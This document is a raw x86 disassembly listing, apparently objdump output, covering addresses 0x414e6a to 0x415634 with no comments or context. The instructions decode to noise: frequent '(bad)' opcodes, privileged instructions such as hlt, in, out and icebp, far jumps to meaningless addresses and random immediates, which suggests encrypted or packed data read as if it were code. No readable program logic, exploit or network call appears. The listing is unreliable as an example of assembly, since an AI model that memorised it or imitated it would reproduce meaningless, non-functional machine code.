  414e6a:	add    eax,0xbfb8fa43
  414e6f:	loope  0x414e04
  414e71:	in     al,0x43
  414e73:	addr16 mov cl,0x1a
  414e76:	add    ah,BYTE PTR [edi]
  414e78:	arpl   WORD PTR [edi+0x13],cx
  414e7b:	mov    edi,0xa1b15090
  414e80:	pop    eax
  414e81:	jl     0x414ed8
  414e83:	and    DWORD PTR [edi-0xf],0x2d
  414e87:	ja     0x414f04
  414e89:	nop
  414e8a:	cmp    edi,DWORD PTR [eax+eiz*8]
  414e8d:	mov    esp,0x739a3723
  414e92:	and    eax,0xdcbc0390
  414e97:	xor    cl,BYTE PTR [eax-0x52]
  414e9a:	(bad)  
  414e9b:	push   0x60
  414e9d:	push   0x1192c85a
  414ea2:	inc    ebx
  414ea3:	int3   
  414ea4:	jo     0x414e55
  414ea6:	xchg   ebx,eax
  414ea7:	xor    eax,DWORD PTR [ebp-0x7a276214]
  414ead:	cmp    eax,0xaa99ee65
  414eb2:	fldenv [eax]
  414eb4:	fsubr  QWORD PTR [eax]
  414eb6:	fdivr  DWORD PTR [edi+0x45]
  414eb9:	scas   al,BYTE PTR es:[edi]
  414eba:	add    DWORD PTR [ebx-0x52],edi
  414ebd:	dec    edx
  414ebe:	xchg   ebx,eax
  414ebf:	pop    es
  414ec0:	jecxz  0x414ed9
  414ec2:	into   
  414ec3:	(bad)  
  414ec5:	cld    
  414ec6:	xor    edx,0xffffffe3
  414ec9:	push   ss
  414eca:	xor    eax,0x6327f5a1
  414ecf:	push   edx
  414ed0:	pushf  
  414ed1:	retf   
  414ed2:	bound  eax,QWORD PTR [esi+0x2fe4022f]
  414ed8:	mov    al,0x62
  414eda:	ficom  DWORD PTR [ecx]
  414edc:	fs jmp 0x414eb0
  414edf:	mov    al,ds:0x5cfe5515
  414ee4:	dec    esi
  414ee5:	dec    esp
  414ee6:	inc    eax
  414ee7:	cwde   
  414ee8:	sub    bl,BYTE PTR ds:0x44c80af0
  414eee:	nop
  414eef:	cmp    ebp,esi
  414ef1:	push   ebp
  414ef2:	jae    0x414f4d
  414ef4:	hlt    
  414ef5:	les    edx,FWORD PTR [ecx]
  414ef7:	mov    bl,BYTE PTR [esi-0x4e]
  414efa:	mov    ah,0x55
  414efc:	ret    
  414efd:	cmp    eax,0x1abb1f1e
  414f02:	test   cl,al
  414f04:	cmp    esi,DWORD PTR [esp+eiz*4+0x49]
  414f08:	popf   
  414f09:	mov    eax,cs:0x77ba9c1e
  414f0f:	push   ds
  414f10:	or     BYTE PTR [ebx-0x16a8cdaf],dl
  414f16:	retf   0x3d76
  414f19:	rcl    DWORD PTR [edi],cl
  414f1b:	call   0x19a99de3
  414f20:	dec    edi
  414f21:	gs inc ecx
  414f23:	inc    edx
  414f24:	jno    0x414f28
  414f26:	loope  0x414ebe
  414f28:	stos   DWORD PTR es:[edi],eax
  414f29:	inc    esp
  414f2a:	mov    dl,0x79
  414f2c:	scas   eax,DWORD PTR es:[edi]
  414f2d:	sbb    DWORD PTR [eax-0x2076b347],ebp
  414f33:	or     eax,0x8fc27698
  414f38:	sub    DWORD PTR [esp+edi*1-0x67],edi
  414f3c:	sti    
  414f3d:	adc    DWORD PTR [ebx+0x12],ebx
  414f40:	add    eax,0x411fb6b5
  414f45:	xor    BYTE PTR [edi-0x4c2cc5f7],0x6b
  414f4c:	add    al,0x93
  414f4e:	fistp  DWORD PTR [ebp-0x6c]
  414f51:	pop    eax
  414f52:	pop    edx
  414f53:	retf   0x9032
  414f56:	dec    esp
  414f57:	jp     0x414fd2
  414f59:	mov    dl,0x8f
  414f5b:	xchg   BYTE PTR [ecx],cl
  414f5d:	rol    DWORD PTR [edx],1
  414f5f:	mov    al,ds:0x8226b85c
  414f64:	or     DWORD PTR [ecx+0x38578000],ebx
  414f6a:	sub    esi,ecx
  414f6c:	jle    0x414f2c
  414f6e:	movups XMMWORD PTR [ebx],xmm7
  414f71:	sub    dh,BYTE PTR [edx]
  414f73:	add    eax,0x7c4fe8d2
  414f78:	push   0x49
  414f7a:	ja     0x414f94
  414f7c:	mov    ah,0x3f
  414f7e:	xchg   esi,eax
  414f7f:	jmp    0x90862b59
  414f84:	mov    WORD PTR [edi+0x7686382a],es
  414f8a:	sub    DWORD PTR [ecx],0x48
  414f8d:	mov    WORD PTR cs:[eax+edx*8],?
  414f91:	fsub   DWORD PTR [eax-0x3c]
  414f94:	xchg   DWORD PTR [ecx+eiz*8+0x3f184376],esp
  414f9b:	outs   dx,BYTE PTR ds:[esi]
  414f9c:	adc    al,0xf2
  414f9e:	arpl   cx,si
  414fa0:	jmp    0xfe38625d
  414fa5:	jl     0x414f9b
  414fa7:	icebp  
  414fa8:	adc    BYTE PTR [ebp-0xa40bf13],cl
  414fae:	ins    DWORD PTR es:[edi],dx
  414faf:	cdq    
  414fb0:	mov    al,ds:0x564fd377
  414fb5:	sub    BYTE PTR [ebx-0x52],dl
  414fb8:	push   0x8
  414fba:	stc    
  414fbb:	(bad)  
  414fbd:	sbb    DWORD PTR [edx+0x56b23070],0x72129cc2
  414fc7:	pop    ecx
  414fc8:	les    esi,FWORD PTR [ebx+0x25]
  414fcb:	xor    edi,esi
  414fcd:	das    
  414fce:	fst    DWORD PTR [eax-0x38]
  414fd1:	xchg   esi,eax
  414fd2:	push   es
  414fd3:	iret   
  414fd4:	inc    esi
  414fd5:	inc    edx
  414fd6:	mov    ecx,0xda39830b
  414fdb:	jp     0x415024
  414fdd:	(bad)  
  414fdf:	push   edi
  414fe0:	push   edx
  414fe1:	retf   
  414fe2:	and    dl,BYTE PTR [ecx+0x57]
  414fe5:	jae    0x414fdb
  414fe7:	int3   
  414fe8:	jg     0x414ffb
  414fea:	xor    eax,edx
  414fec:	cs icebp 
  414fee:	xchg   edi,eax
  414fef:	es inc ebx
  414ff1:	or     al,0x6f
  414ff3:	sbb    al,0x19
  414ff5:	sub    al,0x9f
  414ff7:	aaa    
  414ff8:	add    BYTE PTR [ecx+0x61b9be0f],ah
  414ffe:	scas   eax,DWORD PTR es:[edi]
  414fff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  415000:	rol    esi,0xe2
  415003:	inc    esp
  415004:	push   0x95bea758
  415009:	dec    edx
  41500a:	(bad)  
  41500b:	mov    edi,0x68a7bc6e
  415010:	pop    esp
  415011:	push   DWORD PTR [ecx+0x16]
  415014:	jecxz  0x415075
  415016:	or     dl,BYTE PTR [ebp-0x6d83abc7]
  41501c:	scas   eax,DWORD PTR es:[edi]
  41501d:	mov    ebx,0x367c8d45
  415022:	or     al,0xf6
  415024:	sbb    ebp,esp
  415026:	and    al,0xc
  415028:	sar    edi,0xb4
  41502b:	push   ecx
  41502c:	mov    cl,BYTE PTR ds:0x9f555317
  415032:	cmp    eax,0x5789abf4
  415037:	out    0xbb,eax
  415039:	enter  0x4d51,0xe7
  41503d:	pop    esp
  41503e:	dec    eax
  41503f:	cmp    esi,edi
  415041:	dec    esp
  415042:	lods   al,BYTE PTR ds:[esi]
  415043:	jae    0x415019
  415045:	sbb    BYTE PTR [eax+0x2d290bd3],0xbb
  41504c:	icebp  
  41504d:	jne    0x41503c
  41504f:	ficom  DWORD PTR ds:0xff3533b5
  415055:	or     eax,0x3fee4a93
  41505a:	hlt    
  41505b:	dec    esi
  41505c:	xlat   BYTE PTR ds:[ebx]
  41505d:	aad    0x57
  41505f:	mov    ebp,0x568b2f4c
  415064:	mov    ebp,0x73d57c64
  415069:	push   eax
  41506a:	sub    al,0x80
  41506c:	push   eax
  41506d:	mov    bl,0xbe
  41506f:	es ret 
  415071:	push   esp
  415073:	arpl   ax,dx
  415075:	and    eax,0x46d6f932
  41507a:	add    eax,0xbeda1884
  41507f:	or     edx,DWORD PTR [ebp-0x6482d670]
  415085:	ret    
  415086:	call   0xac1c63af
  41508b:	test   bh,0xd9
  41508e:	jg     0x41508e
  415090:	add    edx,0xd212eb07
  415096:	nop
  415097:	test   BYTE PTR [esi],dh
  415099:	add    al,0xe9
  41509b:	or     DWORD PTR [ebx+0x3d],ebx
  41509e:	or     al,0xc4
  4150a0:	mov    esi,0x423f475b
  4150a5:	add    eax,0xc8efa66d
  4150aa:	aaa    
  4150ab:	les    edi,FWORD PTR ds:0x15969ba7
  4150b1:	sub    ah,BYTE PTR [eax+0x22]
  4150b4:	js     0x415107
  4150b6:	jnp    0x4150da
  4150b8:	loopne 0x4150c5
  4150ba:	add    BYTE PTR [edi-0x144560c1],bh
  4150c0:	xchg   ecx,eax
  4150c1:	or     ecx,DWORD PTR [ebp+0x3a]
  4150c4:	shl    DWORD PTR [ebp+0x47],0x21
  4150c8:	(bad)  
  4150c9:	cli    
  4150ca:	pop    ebp
  4150cb:	push   ss
  4150cc:	leave  
  4150cd:	xchg   esi,eax
  4150ce:	xchg   ebx,eax
  4150cf:	push   edi
  4150d0:	seto   BYTE PTR [edx-0x25]
  4150d4:	xchg   ax,ax
  4150d6:	mov    edx,0x4c6ca22c
  4150db:	bound  esi,QWORD PTR [ebx+0x2e]
  4150de:	scas   eax,DWORD PTR es:[edi]
  4150df:	jbe    0x415117
  4150e1:	add    dl,0xaa
  4150e4:	add    BYTE PTR [ebp+esi*2-0x12df6857],dl
  4150eb:	mov    ebx,0xe026ca8b
  4150f0:	addr16 imul edi,eax,0xffffffe5
  4150f4:	int    0xf4
  4150f6:	fstp   DWORD PTR [ecx-0x2733a02f]
  4150fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4150fd:	jmp    0xb86528c7
  415102:	mov    edx,0x82caa253
  415107:	push   es
  415108:	dec    edi
  415109:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41510a:	jne    0x41516c
  41510c:	popf   
  41510d:	mov    ch,0x68
  41510f:	mov    eax,edi
  415111:	mov    ebp,0xfa1c030a
  415116:	loope  0x415153
  415118:	hlt    
  415119:	jge    0x41517a
  41511b:	jmp    0x6643c231
  415120:	dec    edi
  415121:	shl    DWORD PTR [ecx],1
  415123:	cvtpi2ps xmm3,QWORD PTR [ebx-0x36]
  415127:	push   0x63
  415129:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41512a:	mov    ah,0xb5
  41512c:	in     al,0xd6
  41512e:	cli    
  41512f:	loopne 0x4150d8
  415131:	sbb    dl,BYTE PTR [edi+0x2406db7e]
  415137:	cmp    al,0x6a
  415139:	inc    edx
  41513a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41513b:	cmp    al,ch
  41513d:	cmp    cl,BYTE PTR [edx+edi*8]
  415140:	mov    esi,0xc5b3db42
  415145:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415146:	mov    BYTE PTR [edi],bh
  415148:	sar    edi,cl
  41514a:	(bad)  
  41514b:	sub    ebx,DWORD PTR [esp+ecx*2]
  41514e:	xchg   esi,eax
  41514f:	dec    esp
  415150:	fldcw  WORD PTR [ebp-0x7a]
  415153:	xor    ebp,edx
  415155:	rol    cl,cl
  415157:	int3   
  415158:	push   edi
  415159:	je     0x4150fd
  41515b:	xchg   ebx,eax
  41515c:	mul    DWORD PTR [edx-0x50]
  41515f:	and    al,0xc2
  415161:	adc    edx,DWORD PTR [ecx-0x78591b3a]
  415167:	repz fcmovnb st,st(0)
  41516a:	hlt    
  41516b:	sub    ax,0x65db
  41516f:	mov    ch,0x13
  415171:	stos   BYTE PTR es:[edi],al
  415172:	xchg   edx,eax
  415173:	sub    eax,0x6d3e9274
  415178:	xor    cl,BYTE PTR [eax]
  41517a:	js     0x41513a
  41517c:	sti    
  41517d:	imul   ebp,esp,0xcfa2548f
  415183:	fidivr WORD PTR [ebp-0x8b3023]
  415189:	mul    ebx
  41518b:	test   eax,0x4f6e0434
  415190:	(bad)
  415195:	xor    edi,DWORD PTR [edi+0x2c7c0f25]
  41519b:	inc    ebp
  41519c:	sub    bl,BYTE PTR [eax+0x5bac75c4]
  4151a2:	xlat   BYTE PTR ds:[ebx]
  4151a3:	clc    
  4151a4:	add    DWORD PTR [ebx-0x505cbcb6],0xfbaa9363
  4151ae:	bound  ebp,QWORD PTR [esi+eiz*2]
  4151b1:	cmp    dh,BYTE PTR [ebp+0x51ecd396]
  4151b7:	out    0xbe,al
  4151b9:	in     al,dx
  4151ba:	sbb    BYTE PTR [eax-0x24840a73],bh
  4151c0:	gs addr16 je 0x415178
  4151c4:	mov    ebp,0x26d4cf1a
  4151c9:	xchg   ebp,eax
  4151ca:	loop   0x4151f1
  4151cc:	nop
  4151cd:	js     0x415249
  4151cf:	or     al,0x1d
  4151d1:	imul   esi,esp,0xebadbd82
  4151d7:	sahf   
  4151d8:	mov    esi,0x5bd540b
  4151dd:	(bad)  
  4151de:	push   edi
  4151df:	sub    ah,bh
  4151e1:	iret   
  4151e2:	arpl   WORD PTR ds:0xa2a4f965,ax
  4151e8:	aam    0xa3
  4151ea:	div    DWORD PTR [ebx-0x6b]
  4151ed:	ret    
  4151ee:	mov    ds:0x7a34b677,eax
  4151f3:	jmp    0xd8a3f888
  4151f8:	cmp    cl,BYTE PTR [esi]
  4151fa:	or     bh,BYTE PTR gs:[eax+0x2d9dd246]
  415201:	jo     0x41518a
  415203:	fwait
  415204:	add    esp,ecx
  415206:	(bad)  
  415207:	imul   edx,DWORD PTR [ebx+0x31],0x94c4f509
  41520e:	arpl   bp,dx
  415210:	xchg   edi,eax
  415211:	cmp    ebx,DWORD PTR [esp+eiz*8+0x75]
  415215:	dec    ecx
  415216:	mov    ds:0x96cc44d7,eax
  41521b:	icebp  
  41521c:	mov    bh,0xbc
  41521e:	sti    
  41521f:	jo     0x4151a7
  415221:	fadd   st,st(6)
  415223:	sti    
  415224:	xchg   edi,eax
  415225:	rcl    DWORD PTR ds:0x1d2326b6,0x19
  41522c:	jmp    0x6b56a2d2
  415231:	dec    ebx
  415232:	pop    edx
  415233:	enter  0xdc5d,0xb5
  415237:	loopne 0x4151e1
  415239:	in     al,0xbd
  41523b:	adc    eax,0x799b26d8
  415240:	push   ecx
  415241:	jp     0x4152b8
  415243:	and    edx,ebp
  415245:	in     eax,dx
  415246:	(bad)  
  415247:	mov    ch,0x3
  415249:	loope  0x41526a
  41524b:	cdq    
  41524c:	and    eax,DWORD PTR [esi+0x4c24ab2d]
  415252:	aaa    
  415253:	pop    esp
  415254:	(bad)  [ebx]
  415256:	retf   0x1cb1
  415259:	(bad)  
  41525a:	pop    DWORD PTR [ecx-0xe]
  41525d:	inc    edi
  41525e:	xor    eax,0xd557f183
  415263:	fwait
  415264:	pop    esp
  415265:	ss push ss
  415267:	push   esp
  415268:	or     edx,edx
  41526a:	pop    ds
  41526b:	jmp    FWORD PTR [ebx+0x369c6d42]
  415271:	pop    edx
  415272:	push   ss
  415273:	ins    BYTE PTR es:[edi],dx
  415274:	ficomp WORD PTR [esi+0x50]
  415277:	dec    edi
  415278:	adc    bl,BYTE PTR [ebx]
  41527a:	push   esi
  41527b:	pop    ebp
  41527c:	les    ebp,FWORD PTR [ebx+esi*8+0x33]
  415280:	push   ebp
  415281:	stc    
  415282:	adc    DWORD PTR [ebp-0x30],ecx
  415285:	pushf  
  415286:	iret   
  415287:	mov    ds:0xef583332,eax
  41528c:	cmp    al,0xdb
  41528e:	mov    ch,0xc7
  415290:	inc    ebx
  415291:	(bad)  
  415292:	add    al,BYTE PTR [eax-0x4acc469e]
  415298:	inc    ebp
  415299:	add    BYTE PTR [esi],0x8a
  41529c:	(bad)  
  41529d:	jmp    0xf23a:0x9dc782a7
  4152a4:	cs cdq 
  4152a6:	cmc    
  4152a7:	repnz mov dh,0x98
  4152aa:	loopne 0x4152e7
  4152ac:	jae    0x4152cc
  4152ae:	xchg   BYTE PTR [esi-0x76aaff31],ch
  4152b4:	fstp   TBYTE PTR [edi+0x36]
  4152b7:	out    dx,al
  4152b8:	inc    edi
  4152b9:	pushf  
  4152ba:	test   esp,ecx
  4152bc:	xchg   esp,eax
  4152bd:	stc    
  4152be:	mov    bh,0x66
  4152c0:	add    bl,BYTE PTR [eax+ecx*1+0x6063c51e]
  4152c7:	icebp  
  4152c8:	sub    eax,0xe35a519d
  4152cd:	cli    
  4152ce:	stc    
  4152cf:	add    BYTE PTR [ebp+0x6a],bh
  4152d2:	sbb    al,0x17
  4152d4:	(bad)  
  4152d6:	pop    ds
  4152d7:	or     al,0x5
  4152d9:	mov    ss,esi
  4152db:	loop   0x415293
  4152dd:	inc    edi
  4152de:	and    ebp,edi
  4152e0:	mov    eax,0x151ad19f
  4152e5:	jnp    0x415338
  4152e7:	stos   DWORD PTR es:[edi],eax
  4152e8:	or     BYTE PTR [esi+0x2a],0x15
  4152ec:	mov    edx,0x7c96213b
  4152f1:	mov    ebx,0x2fdd128d
  4152f6:	cmp    ebx,ecx
  4152f8:	jmp    0x84a9:0x50fb55eb
  4152ff:	pop    ss
  415300:	popf   
  415301:	bound  esi,QWORD PTR [eax-0x5afde12f]
  415307:	cmp    eax,0x41ee777f
  41530c:	ds sbb eax,0x60cdefdc
  415312:	sub    eax,0xfc652dcf
  415317:	xor    DWORD PTR [eax],ebx
  415319:	sub    eax,0xf6a6b8c6
  41531e:	not    DWORD PTR [esi]
  415320:	in     eax,0x3b
  415322:	in     eax,dx
  415323:	dec    esp
  415324:	xchg   esi,eax
  415325:	xchg   DWORD PTR ds:0x5af09cca,edi
  41532b:	retf   0xbd9d
  41532e:	lods   eax,DWORD PTR ds:[esi]
  41532f:	sub    ah,BYTE PTR [ebx]
  415331:	cmp    dl,bh
  415333:	pop    ss
  415334:	retf   0xa48f
  415337:	mov    dl,0xa7
  415339:	repz or BYTE PTR [esi-0x3c],ch
  41533d:	cli    
  41533e:	nop
  41533f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415340:	fld    st(5)
  415342:	sbb    eax,0xa3bca3fa
  415347:	cmp    eax,0xc70a2fd5
  41534c:	mov    WORD PTR [ebp-0x7e060f13],cs
  415352:	cwde   
  415353:	xor    esi,ebx
  415355:	iret   
  415356:	aas    
  415357:	inc    edi
  415358:	jmp    0xa42f:0x8ef284a5
  41535f:	cmp    al,0x64
  415361:	outs   dx,DWORD PTR ds:[esi]
  415362:	int3   
  415363:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415364:	mov    dl,0x11
  415366:	ins    BYTE PTR es:[edi],dx
  415367:	jb     0x415312
  415369:	popa   
  41536a:	cmp    eax,0x474cc7f6
  41536f:	and    ch,BYTE PTR [esi]
  415371:	in     eax,0x3f
  415373:	lea    eax,[ebx-0x40]
  415376:	(bad)  
  415377:	(bad)  
  415378:	xlat   BYTE PTR ds:[ebx]
  415379:	repz inc ecx
  41537b:	xlat   BYTE PTR ds:[ebx]
  41537c:	adc    ebp,DWORD PTR [edi+0x6d]
  41537f:	mov    WORD PTR gs:[esi+0x79],cs
  415383:	out    0xb3,eax
  415385:	push   0x74
  415387:	bndstx [ebx-0x8bcc6b9],(bad)
  41538e:	in     ax,0xd8
  415391:	bound  edi,QWORD PTR [eax+ebp*1]
  415394:	push   0x1c3cdaa6
  415399:	jnp    0x415381
  41539b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41539c:	fidiv  DWORD PTR [eax+edx*2+0x59]
  4153a0:	fnstenv [eax+edx*1]
  4153a3:	sbb    ecx,ebx
  4153a5:	fisubr DWORD PTR [eax]
  4153a7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4153a8:	pop    ebx
  4153a9:	aad    0xb8
  4153ab:	das    
  4153ac:	inc    edi
  4153ad:	or     ecx,DWORD PTR [ecx+0xb]
  4153b0:	(bad)  [ebx+0x52]
  4153b3:	jne    0x415401
  4153b5:	add    BYTE PTR [ebx],0xc6
  4153b8:	test   al,0x95
  4153ba:	js     0x4153da
  4153bc:	cmp    eax,0x65e76be8
  4153c1:	hlt    
  4153c2:	mov    ch,0x1f
  4153c4:	xor    DWORD PTR [ecx+0x12a5cb0e],esp
  4153ca:	adc    ebx,edx
  4153cc:	mov    DWORD PTR [edi+edx*1],ecx
  4153cf:	xor    ecx,DWORD PTR [eax]
  4153d1:	pusha  
  4153d2:	icebp  
  4153d3:	sub    al,dl
  4153d5:	dec    ebp
  4153d6:	and    BYTE PTR [ebx],0x53
  4153d9:	lods   al,BYTE PTR ds:[esi]
  4153da:	jge    0x415377
  4153dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4153dd:	and    esp,eax
  4153df:	addr16 es cld 
  4153e2:	sub    al,0x7e
  4153e4:	hlt    
  4153e5:	mov    WORD PTR [esi+eiz*4-0x2e9c30b2],?
  4153ec:	push   ebx
  4153ed:	mov    ecx,0x78b32742
  4153f2:	or     al,0x7c
  4153f4:	mov    bh,0x6e
  4153f6:	aaa    
  4153f7:	cmp    al,BYTE PTR [ebx]
  4153f9:	(bad)  
  4153fa:	mov    eax,ds:0xa8a50839
  4153ff:	clc    
  415400:	leave  
  415401:	push   edx
  415402:	jns    0x900e8955
  415408:	sahf   
  415409:	shl    BYTE PTR [esi-0x43],cl
  41540c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41540d:	mov    eax,ds:0xd704ea67
  415412:	push   ds
  415413:	xchg   esp,eax
  415414:	push   ds
  415415:	cs (bad) 
  415417:	xor    edx,ebx
  415419:	arpl   WORD PTR [eax-0x5aea3ce1],bx
  41541f:	shl    bl,0xd9
  415422:	lahf   
  415423:	fld    QWORD PTR [edx+0x677907df]
  415429:	inc    eax
  41542a:	dec    ebx
  41542b:	or     bl,BYTE PTR [esi]
  41542d:	outs   dx,DWORD PTR ds:[esi]
  41542e:	ficom  DWORD PTR [edi+0x74]
  415431:	dec    esi
  415432:	dec    edi
  415433:	inc    DWORD PTR [ebx+esi*2]
  415436:	xchg   ch,dl
  415438:	iret   
  415439:	and    DWORD PTR [edx+0x1a],ebp
  41543c:	push   esi
  41543d:	sbb    al,0xee
  41543f:	test   BYTE PTR [eax+edx*8-0x16e3710a],bh
  415446:	iret   
  415447:	xchg   ebx,eax
  415448:	jno    0x4153cb
  41544a:	fwait
  41544b:	push   edx
  41544c:	or     ch,bl
  41544e:	jmp    0xa7bd:0x7fcbedfb
  415455:	mov    ah,0x15
  415457:	xlat   BYTE PTR ds:[ebx]
  415458:	inc    ebx
  415459:	push   es
  41545a:	xor    DWORD PTR [edi-0x61ba5eee],ebx
  415460:	shl    BYTE PTR [ebp+0x67],cl
  415463:	adc    esi,esi
  415465:	cmp    dh,bl
  415467:	jb     0x41541f
  415469:	ins    DWORD PTR es:[edi],dx
  41546a:	sbb    al,al
  41546c:	popa   
  41546d:	call   0x3d51c921
  415472:	pop    eax
  415473:	fidiv  WORD PTR [ebp-0x3]
  415476:	pop    ebx
  415477:	mov    cl,0x3b
  415479:	mov    es,WORD PTR [ebp-0x2d]
  41547c:	aad    0x9e
  41547e:	sahf   
  41547f:	retf   0xf27f
  415482:	pop    ebx
  415483:	jno    0x4154fb
  415485:	push   cs
  415486:	(bad)
  415489:	pop    ax
  41548b:	mov    ch,ah
  41548d:	outs   dx,DWORD PTR ds:[esi]
  41548e:	dec    ebx
  415490:	repz ds adc ah,al
  415494:	inc    edi
  415495:	pop    ds
  415496:	fwait
  415497:	(bad)  
  415498:	xor    ebx,eax
  41549a:	dec    eax
  41549b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41549c:	outs   dx,DWORD PTR ds:[esi]
  41549d:	das    
  41549e:	ins    DWORD PTR es:[edi],dx
  41549f:	cli    
  4154a0:	and    bl,BYTE PTR [ecx+eiz*8-0x5d]
  4154a4:	or     DWORD PTR [eax],0x297493da
  4154aa:	mov    ?,WORD PTR [esi]
  4154ac:	mov    ebp,0x6c8ead23
  4154b1:	push   esi
  4154b2:	shl    BYTE PTR ds:0xc46a2f88,cl
  4154b8:	repz and al,0x8a
  4154bb:	popa   
  4154bc:	add    eax,0x4679e87c
  4154c1:	jmp    0x41548e
  4154c3:	mov    ?,WORD PTR [ecx]
  4154c5:	adc    DWORD PTR [edx+0x52],ebx
  4154c8:	test   DWORD PTR [esi+0x42b44004],0x56781765
  4154d2:	loop   0x415496
  4154d4:	or     cl,BYTE PTR [ecx*1-0x75e60aad]
  4154db:	or     dh,BYTE PTR [ebp+0x2902ed3e]
  4154e1:	repnz dec esi
  4154e3:	(bad)  [esi]
  4154e5:	adc    al,0x10
  4154e7:	mov    edx,0xdc2b734b
  4154ec:	xchg   edx,eax
  4154ed:	icebp  
  4154ee:	mov    al,0xea
  4154f0:	jne    0x415538
  4154f2:	mov    edx,0x6ba8c463
  4154f7:	and    ah,bl
  4154f9:	outs   dx,DWORD PTR ds:[esi]
  4154fa:	inc    edx
  4154fb:	pushf  
  4154fc:	mov    cl,0xaa
  4154fe:	mov    ds:0xf7cae3a0,eax
  415503:	jl     0x415524
  415505:	jns    0x415490
  415507:	cmp    al,0x33
  415509:	sbb    eax,0x4310c02b
  41550e:	sbb    DWORD PTR [ebx],0x3db66628
  415514:	(bad)  
  415515:	xchg   ebx,eax
  415516:	icebp  
  415517:	outs   dx,DWORD PTR ds:[esi]
  415518:	mov    cl,0xfb
  41551a:	dec    edi
  41551b:	and    cl,BYTE PTR [ebp+0x67034d2d]
  415521:	pop    ss
  415522:	fldcw  WORD PTR [ecx-0x17]
  415525:	sbb    BYTE PTR [esi+esi*2-0x6aa37856],dh
  41552c:	dec    esi
  41552d:	inc    esp
  41552e:	fidivr WORD PTR [ebp+0x3fa318a7]
  415534:	ret    0x51b2
  415537:	jo     0x41550b
  415539:	sub    edi,esi
  41553b:	jmp    0x41553b
  41553d:	outs   dx,BYTE PTR ds:[esi]
  41553e:	push   ecx
  41553f:	(bad)  [edx+0x6b]
  415542:	popf   
  415543:	inc    ecx
  415544:	jnp    0x41556a
  415546:	xchg   esp,eax
  415547:	mov    ds:0xfb4f5faf,eax
  41554c:	dec    ebp
  41554d:	imul   eax,DWORD PTR [edx],0xdadc8451
  415553:	sbb    eax,0x1016980c
  415558:	rcl    DWORD PTR [ecx+0x21],cl
  41555b:	inc    edi
  41555c:	in     al,dx
  41555d:	fidiv  WORD PTR [esi]
  41555f:	xor    BYTE PTR [ebx-0x1cbedc0a],ah
  415565:	xchg   ebp,ecx
  415567:	fucomi st,st(6)
  415569:	push   edi
  41556a:	push   0x6fe68b04
  41556f:	popf   
  415570:	scas   al,BYTE PTR es:[edi]
  415571:	scas   al,BYTE PTR es:[edi]
  415572:	jo     0x415505
  415574:	pop    ebp
  415575:	int3   
  415576:	(bad)  
  415577:	leave  
  415578:	xor    DWORD PTR [ebp+0x72c73216],ebp
  41557e:	or     BYTE PTR [edx+edi*2-0x9],0x9e
  415583:	dec    ecx
  415584:	mov    ds:0xffdb0bcd,eax
  415589:	sahf   
  41558a:	dec    ecx
  41558b:	xchg   edx,eax
  41558c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41558d:	rol    esp,1
  41558f:	xchg   edi,ecx
  415591:	cld    
  415592:	adc    bh,BYTE PTR [edi-0x7d]
  415595:	adc    DWORD PTR [ecx],esp
  415597:	push   eax
  415598:	adc    DWORD PTR [edi],0x78
  41559b:	inc    ebp
  41559c:	(bad)  [ecx+edx*4+0x53]
  4155a0:	in     eax,dx
  4155a1:	xchg   DWORD PTR [esi+0x70],ebx
  4155a4:	xchg   esp,eax
  4155a5:	jns    0x415590
  4155a7:	adc    al,0xfd
  4155a9:	xchg   edx,eax
  4155aa:	cmp    DWORD PTR [eax-0x3e],0x40b01597
  4155b1:	push   edx
  4155b2:	loope  0x415609
  4155b4:	jo     0x4155b8
  4155b6:	sbb    bl,BYTE PTR [esi+edx*1+0x56]
  4155ba:	jp     0x415580
  4155bc:	outs   dx,BYTE PTR ds:[esi]
  4155bd:	cwde   
  4155be:	(bad)  
  4155bf:	scas   eax,DWORD PTR es:[edi]
  4155c0:	mov    DWORD PTR [ebp-0x5d],edi
  4155c3:	stc    
  4155c4:	mov    edx,0xd90d1ac4
  4155c9:	mov    eax,ds:0xe7a8ec05
  4155ce:	inc    ebx
  4155cf:	mov    BYTE PTR [ecx],bl
  4155d1:	je     0x4155f7
  4155d3:	adc    al,0x6
  4155d5:	(bad)  
  4155d6:	repz ret 
  4155d8:	jmp    0x83c3:0x88f2cb3e
  4155df:	les    esp,FWORD PTR [ecx]
  4155e1:	scas   eax,DWORD PTR es:[edi]
  4155e2:	dec    ecx
  4155e3:	inc    ebx
  4155e4:	pop    esi
  4155e5:	(bad)  
  4155e6:	loope  0x4155e3
  4155e8:	jno    0x4155aa
  4155ea:	mov    DWORD PTR [edx],esp
  4155ec:	int    0xbe
  4155ee:	out    0x88,al
  4155f0:	xchg   edi,eax
  4155f1:	cmp    DWORD PTR [ecx-0x29df3d2c],esp
  4155f7:	stos   BYTE PTR es:[edi],al
  4155f8:	dec    edx
  4155f9:	push   ebp
  4155fa:	jnp    0x415606
  4155fc:	sahf   
  4155fd:	mov    esi,0x6d989701
  415602:	jg     0x415609
  415604:	cld    
  415605:	lea    ebp,[ebx]
  415607:	(bad)  
  415609:	cmp    dh,BYTE PTR [eax-0xf]
  41560c:	(bad)  
  41560e:	inc    esp
  41560f:	or     al,0x7
  415611:	dec    ecx
  415612:	mov    dh,0xce
  415614:	dec    esp
  415615:	pop    edi
  415616:	pushf  
  415617:	lods   al,BYTE PTR ds:[esi]
  415618:	repnz inc ebp
  41561a:	gs mov dl,ch
  41561d:	jnp    0x415682
  41561f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415620:	mov    bh,0x1e
  415622:	jo     0x415622
  415624:	mov    esp,0x3977523e
  415629:	and    ah,BYTE PTR [edx-0x4a]
  41562c:	pop    eax
  41562d:	sbb    ah,BYTE PTR [esi+edi*1+0x4e91ee2]
  415634:	sti    
